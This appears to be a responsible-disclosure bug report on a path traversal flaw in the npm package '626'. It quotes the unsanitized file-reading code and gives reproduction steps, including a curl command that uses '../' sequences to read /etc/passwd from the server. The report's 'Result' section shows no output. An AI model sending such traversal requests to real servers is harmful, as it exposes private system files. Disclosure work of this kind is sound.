Summary:

Hi Guys,

There is Path Traversal vulnerability in 626 module, which allows to read arbitrary file from the remote server.

## Module

**626**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/626

version: 1.1.1

Stats

19 downloads in the last week
103 downloads in the last month

~1200 estimated downloads per year


## Description

This vulnerability exists, because there is no sanitization of path of requested file:

```javascript
// node_modules/626/index.js, line 15:

    var url = resolveUrl(req.url);
    var file = path.resolve(url);
    log(url + ': ' + file);

    fs.readFile(file, 'utf8', function (err, content) {
        if (err) {
            return res.end('error: file not found ' + file);
        }

```

## Steps To Reproduce:

- install ```626``` module

```
$ npm install 626
```

- run server from command line:

```
$ ./node_modules/626/index.js
Listening on 8080
```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

Result:

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
